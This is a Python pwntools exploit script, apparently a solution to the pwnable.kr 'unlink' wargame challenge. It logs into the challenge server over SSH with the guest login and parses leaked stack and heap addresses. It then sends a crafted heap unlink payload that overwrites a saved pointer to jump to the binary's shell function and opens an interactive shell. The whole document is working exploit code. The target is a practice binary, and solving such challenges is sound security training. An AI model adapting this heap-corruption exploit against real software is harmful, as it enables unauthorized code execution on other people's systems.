#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./unlink')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    else:
        s = ssh(host='pwnable.kr', user='unlink', port=2222, password='guest')
        return s.process(['./unlink'])

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# gets
#break *0x080485e4

# malloc A
break *0x08048548

# malloc B
break *0x08048555

# unlink
break *0x080485f2

# MOV ECX ,dword ptr [EBP - 0xc]
break *0x080485ff
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

shell_addr = exe.symbols['shell']

io = start()

io.recvuntil('here is stack address leak: ')
stack_addr_a = int(io.recvline(), 16)
io.recvuntil('here is heap address leak: ')
heap_addr_a = int(io.recvline(), 16)
io.recvuntil('now that you have leaks, get shell!\n')

print("Stack 0x%08x. Heap 0x%08x. shell 0x%08x" % (stack_addr_a, heap_addr_a, shell_addr))

ebp_esp = stack_addr_a + 0x1c - 0xc

print("ebp_esp 0x%08x." % ebp_esp)

buf_size = 8
padding = 8

a_buf_padding = p32(shell_addr)
while len(a_buf_padding) < buf_size + padding:
    a_buf_padding += b'A'
b_fd = p32(ebp_esp - 4)
b_bk = p32(heap_addr_a + 12)

# [b_fd+4] = b_bk
# [b_bk]   = b_fd

payload = (
    a_buf_padding +
    b_fd +
    b_bk
)

assert b'\n' not in payload

io.sendline(payload)

io.interactive()

